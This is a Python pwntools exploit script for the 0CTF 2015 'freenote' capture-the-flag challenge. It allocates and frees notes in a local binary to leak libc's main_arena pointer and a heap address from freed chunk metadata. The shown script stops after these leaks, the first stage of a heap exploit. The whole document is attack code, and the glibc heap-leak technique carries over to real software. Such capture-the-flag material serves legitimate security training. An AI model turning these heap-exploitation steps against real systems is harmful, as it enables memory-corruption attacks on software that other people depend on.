#
# 0CTF 2015 pwn freenote
#

from pwn import *

r = process('./freenote')

b = ELF('./freenote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = b.arch
context.log_level = 'info'

def new_note(s):
    r.send('2\n')
    r.sendafter('Length of new note:', str(len(s))+'\n')
    r.sendafter('Enter your note:', s)

def delete_note(n):
    r.send('4\n')
    r.sendafter('Note number:', str(n)+'\n')

#
# 1 free() -> fd & bk pointer points <main_arena>
#
def leak_after_one_free():
    r.send('1\n')
    r.recvuntil('CCCCCCCC')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l) 
    
    l = l + '\x00\x00'
    l = u64(l)
    log.info('leaked libc: 0x%x' % l)
    return l

#
# 2 free()s -> 
# the 1st free chunk -> fd points the 2nd free chunk (bk points <main_arena>)
# the 2nd free chunk -> bk points the 1st free chunk (fd points <main_arena>)
#
def leak_after_two_free():
    r.send('1\n')
    r.recvuntil('DDDDDDDD')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l)

    l = u32(l)
    log.info('leaked heap: 0x%x' % l)
    return l

if __name__ == "__main__":
    r.recvuntil('Your choice:')

    new_note(p32(0xdeadbeef))
    new_note(p32(0xdeadbeef))

    delete_note(0)

    new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
    
    #offset = 0x7f103fc32b78 - 0x7f103f86e000 
    main_arena = leak_after_one_free() 

    log.info('main_arena: 0x%x' % main_arena)

    raw_input('after leaking main_arena...')

    delete_note(0)
    delete_note(1)
    
    raw_input('after free two 0xdeadbeef...')

    for _ in xrange(4):
        new_note(p32(0xcafebabe))

    raw_input('after malloc four 0xcafebabe...')

    delete_note(2)
    delete_note(0)
    
    raw_input('after 2 frees...')

    new_note('D'*8)
    #offset = 0x01c20820 - 0x01c1f000
    leaked_heap = leak_after_two_free()
    
    raw_input('after leaking something...')